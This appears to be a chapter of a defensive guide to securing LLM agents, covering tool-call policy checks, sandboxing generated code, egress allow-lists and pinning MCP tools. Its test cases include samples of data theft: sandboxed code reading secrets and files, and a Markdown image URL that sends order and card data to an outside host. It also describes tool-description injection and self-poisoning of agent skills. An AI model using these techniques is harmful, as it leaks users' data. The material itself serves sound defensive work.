---
origin: synthesis
sources:
  - https://arxiv.org/abs/2506.08837
  - https://arxiv.org/abs/2503.18813
  - https://genai.owasp.org/llm-top-10/
  - https://arxiv.org/abs/2608.25776
  - https://arxiv.org/abs/2406.13352
confidence: medium
cleaned: 2026-11-01
---

# 4 — Tool and Execution Sandboxing

> The model proposes and your code disposes. A tool call is a request from a semi-trusted party, so it goes through the same checks as a request from the public internet, and anything it executes runs somewhere it can do little harm.

Harbour's team adds one more tool: a small code runner, so the agent can total a customer's refunds across orders from a CSV export. Three weeks later a bug in generated code keeps a small worker spinning for a whole afternoon, and a reviewer notices the runner could also read the service's environment variables, including the mail API key. No attacker was involved, and it would have been just as bad with one. Everything in the earlier chapters limits what a fooled model is likely to try. This chapter is about what happens when it tries anyway, and the enforcement that still holds.

[Execution boundaries](../../03-harness-engineering/notes/04-execution-boundaries.md) covers the mechanics in depth: sandbox kinds, hooks, permission gates, coding-agent specifics and rollback. Read it for how those work. This chapter adds the security view, meaning which boundary answers which threat, and three pieces of working code the harness note doesn't have: a tool policy, an egress check, and a pin on what you installed.

## The boundaries, from the outside in

OWASP names the two failures this chapter is about. **Excessive agency** ([LLM06](https://genai.owasp.org/llm-top-10/)) is an agent with more tools, permissions or autonomy than its task needs. **Improper output handling** (LLM05) is passing model output to something that acts on it without checking. Beurer-Kellner et al. ([arXiv:2506.08837](https://arxiv.org/abs/2506.08837), 2025-06, preprint) list sandboxing and user confirmation as best practices that apply whatever pattern you choose, on top of the design patterns themselves.

```text
 model proposes a call
        |
        v
 [1] tool exists for this task?      least agency; fewer tools, fewer paths
        v
 [2] arguments valid and in scope?   schema, ownership, value limits
        v
 [3] identity from the session?      per-user, short-lived credentials
        v
 [4] needs a person?                 approval for irreversible actions
        v
 [5] where does it run?              process, container, VM; files, CPU, time
        v
 [6] what can it reach?              egress allow-list on network and on rendering
        v
 [7] what did it do?                 audit log (chapter 6)
```

Each layer assumes that the one before it has failed. That's the difference between defence in depth and a stack of filters with the same blind spot. A schema won't catch a valid-looking refund to the wrong person, but ownership will. Ownership checks don't stop a code runner reading environment variables, but process isolation does.

## A policy engine for tool calls

The most useful piece of security code in an agent is often the shortest: a function between the model's proposal and the actual tool. It has no model in it. It can be unit tested, it logs every decision, and it can't be talked out of anything.

```python
from dataclasses import dataclass

@dataclass
class Session:
    customer_id: str      # from authentication, never from the model
    refunds_today: float = 0.0

ORDERS = {"118": ("ana", 40.0), "119": ("ana", 900.0), "207": ("ben", 25.0)}
AUTO_LIMIT, DAILY_LIMIT = 100.0, 500.0

def decide(tool, args, session):
    if tool not in {"get_order", "refund"}:
        return "DENY", "tool not available for this task"
    order = ORDERS.get(str(args.get("order_id")))
    if order is None:
        return "DENY", "unknown order"
    owner, paid = order
    if owner != session.customer_id:
        return "DENY", "order belongs to another customer"
    if tool == "get_order":
        return "ALLOW", "own order"
    amount = args.get("amount")
    if not isinstance(amount, (int, float)) or not 0 < amount <= paid:
        return "DENY", f"amount must be between 0 and {paid}"
    if session.refunds_today + amount > DAILY_LIMIT:
        return "APPROVE", "over daily limit, needs a person"
    if amount > AUTO_LIMIT:
        return "APPROVE", "over automatic limit, needs a person"
    return "ALLOW", "within limits"

s = Session("ana")
calls = [
    ("get_order", {"order_id": 118}),
    ("get_order", {"order_id": 207}),
    ("refund", {"order_id": 118, "amount": 40}),
    ("refund", {"order_id": 118, "amount": 4000}),
    ("refund", {"order_id": 119, "amount": 300}),
    ("delete_account", {"order_id": 118}),
]
for tool, args in calls:
    verdict, why = decide(tool, args, s)
    print(f"{verdict:8} {tool:15} {str(args):38} {why}")
```

Output:

```text
ALLOW    get_order       {'order_id': 118}                      own order
DENY     get_order       {'order_id': 207}                      order belongs to another customer
ALLOW    refund          {'order_id': 118, 'amount': 40}        within limits
DENY     refund          {'order_id': 118, 'amount': 4000}      amount must be between 0 and 40.0
APPROVE  refund          {'order_id': 119, 'amount': 300}       over automatic limit, needs a person
DENY     delete_account  {'order_id': 118}                      tool not available for this task
```


Compare this with the same rules written into a system prompt. There they're guidance a model usually follows. Here they're properties of the system, and the second call fails no matter how persuasive the text the model read. [Encode constraints, don't document them](../../03-harness-engineering/notes/04-execution-boundaries.md#encode-constraints-dont-document-them) makes this point more generally.

The `APPROVE` path needs design as well. A person who sees hundreds of approval prompts stops reading them, so reserve them for actions that are truly irreversible and show what the call will really do, with its resolved values. [Permission gates](../../03-harness-engineering/notes/04-execution-boundaries.md#permission-gates-and-hitl) goes through the options.

**Credentials follow the same logic.** A tool holding a service-wide key turns any confused-deputy bug into access to everything. Give each call a short-lived token scoped to the customer in the session, so that a bypass of the policy still meets a database that says no. The agent itself shouldn't see the token, and the tool layer should inject it. Anything the model can read, an injection can try to print.

## Isolating code the model wrote

Running generated code is the sharpest version of the problem, since the model picks what runs. [Execution boundaries](../../03-harness-engineering/notes/04-execution-boundaries.md#sandboxes) goes through the sandbox options. To see which threat each option addresses, it helps to build the weakest one that is still better than nothing, and then see what it fails to stop.

```python
import os, resource, subprocess, sys, tempfile, textwrap

def limits():
    resource.setrlimit(resource.RLIMIT_CPU, (1, 1))              # seconds of CPU
    resource.setrlimit(resource.RLIMIT_FSIZE, (1_000_000, 1_000_000))  # bytes per file
    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))

def run(code):
    with tempfile.TemporaryDirectory() as workdir:
        try:
            p = subprocess.run([sys.executable, "-I", "-c", code], cwd=workdir, env={},
                               capture_output=True, text=True, timeout=5,
                               preexec_fn=limits)
            tail = (p.stdout or p.stderr).strip().splitlines()
            return f"exit {p.returncode}: {tail[-1] if tail else ''}"
        except subprocess.TimeoutExpired:
            return "killed by wall-clock timeout"

os.environ["MAIL_API_KEY"] = "synthetic-not-a-real-key"
secret = tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False)
secret.write("synthetic customer export\n")
secret.close()

cases = {
    "normal work":      "print(sum([40, 25, 12.5]))",
    "runaway loop":     "while True: pass",
    "env secret":       "import os; print(os.environ.get('MAIL_API_KEY', 'not visible'))",
    "disk filler":      "open('x','wb').write(b'0' * 10_000_000); print('wrote')",
    "file outside dir": f"print(open({secret.name!r}).read())",
}
for name, code in cases.items():
    print(f"{name:17} {run(code)}")
os.unlink(secret.name)
```

Output:

```text
normal work       exit 0: 77.5
runaway loop      exit -24:
env secret        exit 0: not visible
disk filler       exit 1: OSError: [Errno 27] File too large
file outside dir  exit 0: synthetic customer export
```


The runaway loop's exit code of -24 is the signal `SIGXCPU`, meaning the CPU limit fired before the wall-clock timeout. The last line is the lesson. Clearing the environment, limiting CPU and limiting file size stop the accidents, and the child can still read any file the parent's user can read, and it can still open a network connection. Resource limits aren't confinement. Real confinement comes from the operating system or a virtual machine: a container with a read-only filesystem and no network, or better, a microVM or a hosted sandbox when the code comes from anywhere you don't trust. Pick by asking which failure would hurt.

| Threat | Rlimits, clean env | Container, no network | MicroVM or hosted sandbox |
|---|---|---|---|
| Runaway CPU, disk filling | Yes | Yes | Yes |
| Reading service secrets in the environment | Yes | Yes | Yes |
| Reading other files on the host | No | Yes | Yes |
| Calling the network | No | Yes | Yes, if configured |
| Kernel escape from a malicious program | No | Partly: shares the host kernel | Strongest of these |

## Egress: the third leg of the trifecta

A sandbox that can't reach the network can't leak. Most agents need to reach something, so make it a short list. An allow-list is a better fit than a block-list, since the number of hostile hosts isn't bounded, and it directly breaks the external-communication leg from [chapter 1](01-threat-model.md).

The exit people forget is rendering. If the chat UI renders a Markdown image, the browser fetches the URL as soon as the reply appears, with no click, and any data the model put in that URL leaves with the request. So the renderer is an egress point, and the same list has to apply to it.

```python
import re
from urllib.parse import urlparse

ALLOWED = {"help.harbour.example", "cdn.harbour.example"}
MD_LINK = re.compile(r"(!?)\[([^\]]*)\]\(([^)\s]+)[^)]*\)")

def allowed_url(url):
    u = urlparse(url)
    return u.scheme == "https" and u.hostname in ALLOWED and not u.query

def sanitise(reply):
    def fix(m):
        bang, text, url = m.groups()
        if allowed_url(url):
            return m.group(0)
        return f"{text} [link removed]" if text else "[image removed]"
    return MD_LINK.sub(fix, reply)

replies = [
    "See [refund policy](https://help.harbour.example/refunds).",
    "Status below ![](https://outside.example/p.png?d=order-118-card-4242)",
    "Lookalike [help](https://help.harbour.example.outside.example/x)",
    "With data [help](https://help.harbour.example/x?d=order-118)",
    "Plain url https://outside.example/?d=secret stays as text",
]
for r in replies:
    print(sanitise(r))
```

Output:

```text
See [refund policy](https://help.harbour.example/refunds).
Status below [image removed]
Lookalike help [link removed]
With data help [link removed]
Plain url https://outside.example/?d=secret stays as text
```


The filter checks the parsed hostname exactly, because substring matching passes the lookalike. It also rejects query strings on allowed hosts, since an allowed host with a logging endpoint can still receive data. The last line shows what this code doesn't do. A plain URL stays as text, which requires a user click to leak, so whether to rewrite it is a product decision. Do this at the renderer, as well as the server, if you can, and add a Content-Security-Policy so that a bug in one doesn't defeat the other.

## Pin what you installed

Tool definitions are text the model reads, and it treats them as guidance. Installing an MCP server therefore adds code dependencies and adds instructions to your agent's context. If the server later changes a tool's description, what you approved isn't what's running. Pinning brings it back under your control, using the same approach as a lockfile.

```python
import hashlib, json

def fingerprint(tool):
    canonical = json.dumps(tool, sort_keys=True, separators=(",", ":"))
    return hashlib.sha256(canonical.encode()).hexdigest()[:16]

def check(pins, live):
    problems = []
    for name, tool in live.items():
        if name not in pins:
            problems.append(f"NEW      {name}: not reviewed")
        elif pins[name] != fingerprint(tool):
            problems.append(f"CHANGED  {name}: definition differs from pin")
    problems += [f"REMOVED  {n}" for n in pins if n not in live]
    return problems

reviewed = {
    "lookup_rate": {"description": "Get a shipping rate.",
                    "params": {"zone": "string"}},
}
pins = {n: fingerprint(t) for n, t in reviewed.items()}

live = {
    "lookup_rate": {"description": "Get a shipping rate. <changed text addressed to the model>",
                    "params": {"zone": "string"}},
    "export_contacts": {"description": "Export contact list.", "params": {}},
}
print("at review:", check(pins, reviewed) or "clean")
print("today:")
for line in check(pins, live):
    print("  ", line)
```

Output:

```text
at review: clean
today:
   CHANGED  lookup_rate: definition differs from pin
   NEW      export_contacts: not reviewed
```


Run this when the agent starts, and fail closed: a changed tool isn't exposed to the model until someone has reviewed it. It catches drift and later tampering, and doesn't tell you that the first version was honest, which is what a review is for. The same logic covers the wider supply chain: pin model weights by hash and prefer `.safetensors`, pin packages, and vendor or mirror what you can.

### When the agent writes its own tools

Pinning assumes a person reviews changes. Self-improving agents remove that person. EvoMal, [arXiv:2608.25776](https://arxiv.org/abs/2608.25776) (Wu et al., 2026-08, preprint), shows the risk: an agent that imitates a planted malicious skill writes new ones, with self-poisoning rates of 20.3% to 41.8% across six models on 153 SWE-bench Verified tasks, and the authors report that the problem persists after the planted skills are removed. A counter-prompt defence cut the rate to at most 6.7%. Treat a skill library as code in your supply chain, not as notes. Writes to it go through review, entries record who or what wrote them and from what context, and an agent run that has read untrusted input doesn't get write access. [Guardrails for self-modifying loops](../../04-loop-engineering/notes/09-failure-modes-and-guardrails.md#guardrails-for-self-modifying-loops) has further rules.

## Test the boundary itself

A boundary that hasn't been tested is an assumption. Deny rules are code and they fail like code. [The canary pattern](../../03-harness-engineering/notes/04-execution-boundaries.md#testing-the-boundary-the-canary-pattern) in the harness pillar shows how: run each route once unguarded to prove the test can see the harm, then guarded, and demand evidence of an actual denial, because a model that happened not to try looks identical to a working control. [Chapter 5](05-red-teaming-tools.md) builds that into a regression suite.

Measure the cost as well as the safety. AgentDojo's authors ([arXiv:2406.13352](https://arxiv.org/abs/2406.13352), Debenedetti et al., NeurIPS 2024) included a tool filter, in which the model first restricts itself to the tools a task requires, among their defences, and they compare defences by plotting attack success against utility rather than reporting either alone. Reuse that plot for your own boundaries.

## Pitfalls

- **Enforcing limits in the prompt.** A rule the model is asked to follow is a suggestion. Put it in the tool layer.
- **Taking identity from a tool argument.** It's the confused-deputy bug in its most common form.
- **Giving the agent a service-wide credential.** A single bypass then reaches every customer.
- **Treating resource limits as a sandbox.** They stop accidents and don't confine file or network access, as the code above shows.
- **Allow-listing the network but not the renderer.** A Markdown image is an outbound request with no click.
- **Matching hosts by substring.** Lookalike domains pass. Parse, and compare exactly.
- **Approving a server once.** Its tool descriptions can change after review unless pinned.
- **Gating everything.** Approval fatigue turns a human check into a reflex. Gate what's irreversible.

## Try it

1. Add a `change_address` tool to `decide` so that it always needs approval and only affects the session's customer. Write the calls that test each branch.
2. In the sandbox code, add a case that opens a network socket to `127.0.0.1`. Does the limit stop it? What would?
3. Add `http` and uppercase-host cases to `sanitise`. Do they behave correctly? Why does `urlparse` matter?
4. Decide how the pin check should treat a tool whose only change is a whitespace edit in its description. Change the code to match your decision, and say what you gave up.

<details><summary>Answers</summary>

1. Add it to the tool set and return `APPROVE` after the ownership check. Test an unknown order, another customer's order and the customer's own order.
2. No. Rlimits don't control network access, so the socket call reaches the kernel and fails only if nothing is listening. A network namespace, a container with no network or an egress proxy would stop it.
3. `http` is rejected by the scheme check. `urlparse(...).hostname` lowercases the host, so an uppercase allowed host still passes, correctly. String matching would get both of these wrong in one direction or another.
4. You could normalise whitespace before hashing, which reduces noise. The cost is a small blind spot: whitespace changes could matter inside code or formatting. Most teams should keep the strict hash and accept the occasional review.

</details>

## Interview checklist

| Question | Answer |
|---|---|
| What is excessive agency? | OWASP LLM06: an agent with more tools, permissions or autonomy than its task needs. The fix is least agency, per task and per user. |
| Where does a refund limit belong? | In the tool layer, in plain code, since a prompt rule can be argued around. The model's output is a proposal. |
| What's a confused deputy here? | A privileged tool acting on another party's behalf because it trusted a model-supplied identity. Bind identity from the session and use per-user credentials. |
| Are rlimits and a clean env enough for model-written code? | They stop runaway resources and environment leaks, and they don't confine files or network. Use a container with no network, or a microVM for untrusted code. |
| How can a chat reply leak data without any tool? | A rendered Markdown image or link carrying data in its URL. The browser's request is the exfiltration. Allow-list at the renderer. |
| How would you secure an MCP server you installed? | Pin a hash of each tool definition, fail closed on change, scope its credentials, restrict its network, and review new versions like code. |
| Why treat an agent's skill library as supply chain? | Agents can self-poison by imitating bad skills, as EvoMal measured, and removing the originals doesn't fully clear it. Gate and attribute writes. |

## Next

You now have boundaries you believe in. [Red-teaming tools](05-red-teaming-tools.md) turns that belief into evidence, and keeps it true after every change.
